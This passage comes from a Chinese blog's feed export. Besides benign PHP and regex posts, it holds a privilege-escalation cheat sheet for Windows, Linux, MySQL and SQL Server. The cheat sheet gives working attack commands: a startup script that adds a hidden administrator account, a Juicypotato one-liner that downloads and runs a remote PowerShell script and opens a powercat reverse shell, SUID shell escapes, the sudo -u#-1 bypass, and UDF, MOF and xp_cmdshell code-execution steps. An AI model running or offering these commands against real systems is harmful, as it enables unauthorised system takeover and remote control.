class="number">-41004</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $DecryptAESError = <span class="number">-41005</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $ValidateAppidError = <span class="number">-41006</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $ErrorMsg = [</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="string">'ok'</span>,</span><br><span class="line">        <span class="number">-41001</span> =&gt; <span class="string">'aes 解密失败'</span>,</span><br><span class="line">        <span class="number">-41002</span> =&gt; <span class="string">'解密后得到的buffer非法'</span>,</span><br><span class="line">        <span class="number">-41003</span> =&gt; <span class="string">'base64加密失败'</span>,</span><br><span class="line">        <span class="number">-41004</span> =&gt; <span class="string">'base64解密失败'</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取手机号</span></span><br><span class="line">$tool = <span class="keyword">new</span> WxDataDecrypt(ENV(<span class="string">'WX_APPID'</span>), $arr[<span class="string">'_session_key'</span>]);</span><br><span class="line">$error = $tool-&gt;decryptData($arr[<span class="string">'encryptedData'</span>], $arr[<span class="string">'iv'</span>], $decryptRet);</span><br><span class="line"><span class="keyword">if</span> ($error) &#123;</span><br><span class="line">    <span class="keyword">echo</span> ErrorCode::$ErrorMsg[$error] ?? <span class="string">'未知错误'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $decryptRet = json_decode($decryptRet, <span class="keyword">true</span>);</span><br><span class="line">    $tel_phone = $decryptRet[<span class="string">'purePhoneNumber'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"phone: &#123;$tel_phone&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="五、简化"><a href="#五、简化" class="headerlink" title="五、简化"></a>五、简化</h3><p>上面的代码比较复杂，那就看下面的代码吧, 调用方法完全一致。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WxDataDecrypt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $appid;</span><br><span class="line">    <span class="keyword">private</span> $sessionKey;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * error code 说明.</span></span><br><span class="line"><span class="comment">     * &lt;ul&gt;</span></span><br><span class="line"><span class="comment">     *    &lt;li&gt;-41001: encodingAesKey 非法&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *    &lt;li&gt;-41003: aes 解密失败&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *    &lt;li&gt;-41004: 解密后得到的buffer非法&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *    &lt;li&gt;-41005: base64加密失败&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *    &lt;li&gt;-41016: base64解密失败&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $OK = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $IllegalAesKey = <span class="number">-41001</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $IllegalIv = <span class="number">-41002</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $IllegalBuffer = <span class="number">-41003</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $DecodeBase64Error = <span class="number">-41004</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $ErrorMsg = [</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="string">'ok'</span>,</span><br><span class="line">        <span class="number">-41001</span> =&gt; <span class="string">'aes 解密失败'</span>,</span><br><span class="line">        <span class="number">-41002</span> =&gt; <span class="string">'解密后得到的buffer非法'</span>,</span><br><span class="line">        <span class="number">-41003</span> =&gt; <span class="string">'base64加密失败'</span>,</span><br><span class="line">        <span class="number">-41004</span> =&gt; <span class="string">'base64解密失败'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造函数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $sessionKey string 用户在小程序登录后获取的会话密钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $appid string 小程序的appid</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($appid, $sessionKey)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;appid = $appid;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionKey = $sessionKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检验数据的真实性，并且获取解密后的明文.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $encryptedData string 加密的用户数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $iv string 与用户数据一同返回的初始向量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $data string 解密后的原文</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int 成功0，失败返回对应的错误码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptData</span><span class="params">($encryptedData, $iv, &amp;$data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;sessionKey) != <span class="number">24</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$IllegalAesKey;</span><br><span class="line">        &#125;</span><br><span class="line">        $aesKey = base64_decode(<span class="keyword">$this</span>-&gt;sessionKey);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strlen($iv) != <span class="number">24</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$IllegalIv;</span><br><span class="line">        &#125;</span><br><span class="line">        $aesIV = base64_decode($iv);</span><br><span class="line"></span><br><span class="line">        $aesCipher = base64_decode($encryptedData);</span><br><span class="line"></span><br><span class="line">        $result = openssl_decrypt($aesCipher, <span class="string">"AES-128-CBC"</span>, $aesKey, OPENSSL_RAW_DATA, $aesIV);</span><br><span class="line"></span><br><span class="line">        $dataObj = json_decode($result);</span><br><span class="line">        <span class="keyword">if</span> ($dataObj == <span class="keyword">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$IllegalBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($dataObj-&gt;watermark-&gt;appid != <span class="keyword">$this</span>-&gt;appid) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$IllegalBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = $result;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>::$OK;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>微信开发</tag>
        <tag>小程序</tag>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title>权限提升姿势</title>
    <url>/articles/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
<p>某段时间突然对权限提升感起了兴趣，在各大论坛和大佬们的博客寻找权限提升的姿势，固有了想对提权姿势进行一次系统整理的打算，本篇文章是对权限提升方法的总结，记录自己学习和复现的过程。</p>
<h2 id="windows篇"><a href="#windows篇" class="headerlink" title="windows篇"></a>windows篇</h2><hr>
<h3 id="windows溢出提权"><a href="#windows溢出提权" class="headerlink" title="windows溢出提权"></a>windows溢出提权</h3><h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><ol>
<li><p>查看系统补丁信息</p>
<p>systeminfo</p>
</li>
<li><p>寻找可用exp</p>
<p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">https://bugs.hacking8.com/tiquan/</a></p>
</li>
<li><p>一把梭！</p>
<p><img src="/articles/权限提升姿势/20200411165225-c3c910d8-7bd1-1.png" alt></p>
</li>
</ol>
<h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><h4 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h4><ul>
<li><p>启动项路径：</p>
<p>C:\Users\{用户名}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
</li>
<li><p>在启动项中创建vbs或bat脚本<br>vbs：</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> wshshell=<span class="built_in">createobject</span>(<span class="string">"wscript.shell"</span>)  </span><br><span class="line">a=wshshell.run(<span class="string">"cmd.exe /c net user 用户名 密码 /add"</span>,<span class="number">0</span>)  </span><br><span class="line">b=wshshell.run(<span class="string">"cmd.exe /c net localgroup administrators 用户名 /add"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>bat： </p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user 用户名 密码 /add  </span><br><span class="line"><span class="built_in">net</span> localgroup administrators 用户名 /add</span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来需要等待机器重启并以较大权限的账号登录，暴力一点可以配合漏洞打蓝屏poc强制重启。</p>
</li>
<li><p>bat脚本运行时会有个dos弹一下，vbs不会弹，建议使用vbs脚本</p>
</li>
</ul>
<h3 id="UAC提权（CVE-2019-1388）"><a href="#UAC提权（CVE-2019-1388）" class="headerlink" title="UAC提权（CVE-2019-1388）"></a>UAC提权（CVE-2019-1388）</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示——Secure Desktop。这些提示是由名为consent.exe的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。因为用户可以与该UI交互，因此对UI来说紧限制是必须的。否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作。即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。事实上，UAC会话中含有尽可能少的点击操作选项。<br>利用该漏洞很容易就可以提升权限到SYSTEM</p>
<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>按照exp作者的描述，影响范围如下：<br>Windows 2008r2 7601 <strong>link OPENED AS SYSTEM</strong><br>Windows 2012r2 9600 <strong>link OPENED AS SYSTEM</strong><br>Windows 2016 14393 <strong>link OPENED AS SYSTEM</strong><br>Windows 2019 17763 link NOT opened<br>Windows 7 SP1 7601 <strong>link OPENED AS SYSTEM</strong><br>Windows 8 9200 <strong>link OPENED AS SYSTEM</strong><br>Windows 8.1 9600 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1511 10240 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1607 14393 <strong>link OPENED AS SYSTEM</strong><br>Windows 10 1703 15063 link NOT opened<br>Windows 10 1709 16299 link NOT opened<br>…</p>
<h4 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h4><ul>
<li><p>EXP地址<br><a href="https://github.com/jas502n/CVE-2019-1388" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-1388</a></p>
</li>
<li><p>复现环境<br>windows 7专业版  </p>
</li>
</ul>
<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
<li><p>将EXP传入系统，点击下图中箭头所指的位置<br><img src="/articles/权限提升姿势/20200411165254-d5277658-7bd1-1.png" alt></p>
</li>
<li><p>点击颁发者中的超链接<br><img src="/articles/权限提升姿势/20200411165334-ed296a54-7bd1-1.png" alt></p>
</li>
<li><p>成功弹出ie，此时ie是以system权限开启<br><img src="/articles/权限提升姿势/20200411165353-f896a92e-7bd1-1.png" alt></p>
</li>
<li><p>页面另存为，输入cmd路径<br><img src="/articles/权限提升姿势/20200411165413-0422e564-7bd2-1.png" alt></p>
</li>
<li><p>权限为system<br><img src="/articles/权限提升姿势/20200411165423-0a3f593c-7bd2-1.png" alt></p>
</li>
</ul>
<h3 id="Juicypotato"><a href="#Juicypotato" class="headerlink" title="Juicypotato"></a>Juicypotato</h3><h4 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h4><p>在尝试windows下的一系列提权操作后都没有成功，可以尝试一下烂土豆，这里在吐司上找到一个大佬改写的juicypotato，自动化程度比原版更高，使用起来更简单，配合webshell食用可以说是非常美味。</p>
<h4 id="复现准备-1"><a href="#复现准备-1" class="headerlink" title="复现准备"></a>复现准备</h4><ul>
<li><p>一个有执行权限的webshell</p>
</li>
<li><p>大佬改版后的<a href="https://www.t00ls.net/viewthread.php?tid=47362&highlight=potato" target="_blank" rel="noopener">Juicypotato</a></p>
</li>
</ul>
<h4 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
<li><p>使用webshell上传烂土豆并执行命令,这里使用powershell做反弹shell  </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Juicypotato.exe -p "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://ip/ps.ps1');powercat -c ip -p 444 -e cmd"</span><br></pre></td></tr></table></figure>


</li>
</ul>
<p>  <img src="/articles/权限提升姿势/20200411172500-519035dc-7bd6-1.png" alt></p>
<p>  <img src="/articles/权限提升姿势/20200411165447-18ac36fc-7bd2-1.png" alt></p>
<h2 id="linux篇"><a href="#linux篇" class="headerlink" title="linux篇"></a>linux篇</h2><hr>
<h3 id="内核溢出"><a href="#内核溢出" class="headerlink" title="内核溢出"></a>内核溢出</h3><p>平常问大佬们linux下的提权，听的最多的就是脏牛一把梭，但是目前实战还没有提成功，固这里简单叙述一下。</p>
<h4 id="具体步骤-2"><a href="#具体步骤-2" class="headerlink" title="具体步骤"></a>具体步骤</h4><ul>
<li><p>查看内核版本</p>
<p>uname -a</p>
</li>
<li><p>寻找exp一把梭  </p>
<p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p>
</li>
</ul>
<h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><h4 id="什么是定时任务"><a href="#什么是定时任务" class="headerlink" title="什么是定时任务"></a>什么是定时任务</h4><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。</p>
<ul>
<li><p>通过命令查看<br>crontab -l<br>注意：只能查看当前用户的定时任务</p>
</li>
<li><p>可以通过以下文件查看现有定时任务<br>/etc/crontab<br>/var/spool/cron/crontabs<br>/etc/cron.*/</p>
</li>
</ul>
<h4 id="提权前提"><a href="#提权前提" class="headerlink" title="提权前提"></a>提权前提</h4><ul>
<li><p>定时任务以root或高权限用户运行</p>
</li>
<li><p>现有较低权限用户拥有对该定时任务文件的写权限</p>
</li>
</ul>
<h4 id="复现准备-2"><a href="#复现准备-2" class="headerlink" title="复现准备"></a>复现准备</h4><ul>
<li>以root身份创建一个定时任务，定时执行py脚本<br><img src="/articles/权限提升姿势/20200411165501-20d27300-7bd2-1.png" alt></li>
</ul>
<h4 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
<li><p>假设我们获取到了一个低权限用户，查看/etc/crontab文件，发现有个以root身份运行的py脚本定时任务<br><img src="/articles/权限提升姿势/20200411165511-273211e2-7bd2-1.png" alt></p>
</li>
<li><p>发现可以对该文件进行读写，在py脚本中执行os命令反弹 shell<br><img src="/articles/权限提升姿势/20200411165518-2b512c4a-7bd2-1.png" alt></p>
</li>
<li><p>该定时任务1分钟运行一次，这里等待服务器接收shell即可<br><img src="/articles/权限提升姿势/20200411165528-3127a2c0-7bd2-1.png" alt></p>
</li>
</ul>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><h4 id="什么是suid提权"><a href="#什么是suid提权" class="headerlink" title="什么是suid提权"></a>什么是suid提权</h4><p>详细介绍可参考<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener"> P牛大大的文章 </a>，简单来说SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</p>
<h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><ul>
<li><p>查找系统中可使用root权限运行的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null  </span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null  </span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些可用于提权的文件</p>
</li>
<li><p>Nmap(2.02-5.21)<br>nmap –interactive<br>!sh</p>
</li>
<li><p>find<br>touch pentestlab<br>find pentestlab -exec whoami \;</p>
</li>
<li><p>less/more<br>less(more) /etc/passwd<br>!/bin/sh</p>
</li>
<li><p>vim/vi<br>vim.tiny<br>:set shell=/bin/sh<br>:shell</p>
</li>
<li><p>git<br>git help config<br>!/bin/bash<br>…</p>
<p>印象中还有一些命令可以达到提权的效果，暂时只收集了这些。这里也是提供了一个思路，找到了能以root运行的命令之后可以去翻阅这个命令的相关参数，看能否达到shell交互的效果。</p>
</li>
</ul>
<h3 id="sudo权限绕过（CVE-2019-14287）"><a href="#sudo权限绕过（CVE-2019-14287）" class="headerlink" title="sudo权限绕过（CVE-2019-14287）"></a>sudo权限绕过（CVE-2019-14287）</h3><p>感觉这个漏洞实战不太会遇到，不过说不定哪天能中呢 :)</p>
<h4 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令：  </p>
<p><img src="/articles/权限提升姿势/20200411165550-3df2a784-7bd2-1.png" alt></p>
<p>通过将用户ID修改为-1（或未签名的等价用户ID-4294967295）可以绕过该配置文件限制，达到权限提升的效果。</p>
<h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><p>sudo &lt; 1.8.28</p>
<h4 id="复现准备-3"><a href="#复现准备-3" class="headerlink" title="复现准备"></a>复现准备</h4><p>手动配置/etc/sudoers文件，添加内容如下：  </p>
<p><img src="/articles/权限提升姿势/20200411165600-445f8588-7bd2-1.png" alt></p>
<p>表示不允许用户xlxxlx以root身份执行任意命令，也就相当于无法使用sudo命令。</p>
<h4 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h4><ul>
<li><p>查看配置文件是否生效  </p>
<p><img src="/articles/权限提升姿势/20200411165607-481be09a-7bd2-1.png" alt></p>
<p>提示xlxxlx用户无法以root身份执行whoami</p>
</li>
<li><p>直接上payload<br>sudo -u#-1 whoami  </p>
<p><img src="/articles/权限提升姿势/20200411165614-4c79927c-7bd2-1.png" alt></p>
</li>
</ul>
<h2 id="Mysql篇"><a href="#Mysql篇" class="headerlink" title="Mysql篇"></a>Mysql篇</h2><hr>
<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h4 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h4><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。</p>
<h4 id="提权过程-1"><a href="#提权过程-1" class="headerlink" title="提权过程"></a>提权过程</h4><p>udf.dll文件的提取可以参考<a href="https://www.jianshu.com/p/5b34c1b6dee7" target="_blank" rel="noopener">这篇文章</a></p>
<ul>
<li><p>mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/<br>mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\</p>
</li>
<li><p>通过sql语句创建自定义命令并执行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> xxx <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span>  </span><br><span class="line"><span class="keyword">select</span> xxx(<span class="string">'cmd'</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里使用一个udf提权马进行复现</p>
<ul>
<li><p>自动导出udf到目录<br><img src="/articles/权限提升姿势/20200411165633-57e31b9c-7bd2-1.png" alt></p>
</li>
<li><p>创建自定义函数并执行提权操作<br><img src="/articles/权限提升姿势/20200411165644-5eab16f0-7bd2-1.png" alt><br><img src="/articles/权限提升姿势/20200411165651-62d8549a-7bd2-1.png" alt></p>
</li>
</ul>
<h3 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h3><h4 id="什么是MOF提权"><a href="#什么是MOF提权" class="headerlink" title="什么是MOF提权"></a>什么是MOF提权</h4><p>mof提权的原理其实很简单，就是利用了 c:/windows/system32/wbem/mof/ 目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，我们把想要执行的cmd命令代入mof文件中即可，和linux下的定时任务提权相似。</p>
<h4 id="MOF代码"><a href="#MOF代码" class="headerlink" title="MOF代码"></a>MOF代码</h4><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">#pragma namespace(<span class="string">"\\.\\root\\subscription"</span>)</span><br><span class="line"></span><br><span class="line">instance of  * * EventFilter as &#123;</span><br><span class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">    Name = <span class="string">"filtP2"</span>;</span><br><span class="line">    Query = <span class="string">"Select * From **InstanceModificationEvent "</span></span><br><span class="line">    <span class="string">"Where TargetInstance Isa \"</span></span><br><span class="line"><span class="string">    Win32_LocalTime\" "</span></span><br><span class="line">    <span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">    QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as &#123;</span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">    ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">    ScriptText =<span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"此处填入cmd命令\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding &#123;</span><br><span class="line">    Consumer = ;</span><br><span class="line">    <span class="built_in">Filter</span> = ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>保存为 xxx.mof<br>然后mysql执行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/xxx.mof'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/windows/system32/wbem/mof/nullevt.mof'</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Sqlserver篇"><a href="#Sqlserver篇" class="headerlink" title="Sqlserver篇"></a>Sqlserver篇</h2><hr>
<h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><h4 id="提权前提-1"><a href="#提权前提-1" class="headerlink" title="提权前提"></a>提权前提</h4><ul>
<li><p>获取sa账号密码，例如查看网站的配置文件conn.asp,config.asp等。</p>
</li>
<li><p>需要开启xp_cmdshell才可执行系统命令  </p>
</li>
</ul>
<h4 id="提权过程-2"><a href="#提权过程-2" class="headerlink" title="提权过程"></a>提权过程</h4><ul>
<li><p>开启xp_cmdshell组件  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/权限提升姿势/20200411165707-6c32c566-7bd2-1.png" alt></p>
</li>
<li><p>如果xp_cmdshell组件被删除，上传xplog70.dll  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXEC master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li><p>执行命令  </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell 'cmd'</span><br></pre></td></tr></table></figure>

<p><img src="/articles/权限提升姿势/20200411165728-78b45ed0-7bd2-1.png" alt></p>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><hr>
<p>这篇文章记录的提权方法都是较新或者比较经典，对实战有帮助的提权方法，其实还有很多其他的提权方法，碍于没有成功复现不好对提权的难度和利用条件做出判断，后续有机会也会慢慢都收录下。</p>
]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>提权</tag>
        <tag>udf.dll</tag>
        <tag>sqlserver</tag>
        <tag>linux</tag>
        <tag>nullevt.mof</tag>
        <tag>mof</tag>
        <tag>suid</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解PHP之foreach</title>
    <url>/articles/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E4%B9%8Bforeach/</url>
    <content><![CDATA[<p>如下代码运行结果为何不是 1/2/3 ？</p>
<p><img src="/articles/深入理解PHP之foreach/1.png" alt></p>
<p>如何解决此类问题呢? PHP手册上有一段提醒:</p>
<p>Warning: 数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留。建议使用 unset() 来将其销毁。</p>
<p><img src="/articles/深入理解PHP之foreach/2.png" alt></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/articles/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><p>下表包含了元字符的完整列表以及它们在正则表达式上下文中的行为：</p>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>\</code></td>
<td align="left">将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “&quot; 而 “(“ 则匹配 “(“。</td>
</tr>
<tr>
<td align="left"><code>^</code></td>
<td align="left">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td>
</tr>
<tr>
<td align="left"><code>$</code></td>
<td align="left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td>
</tr>
<tr>
<td align="left"><code>*</code></td>
<td align="left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td align="left"><code>+</code></td>
<td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td align="left"><code>?</code></td>
<td align="left">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td align="left"><code>{n}</code></td>
<td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td align="left"><code>{n,}</code></td>
<td align="left">n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td align="left"><code>{n,m}</code></td>
<td align="left">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
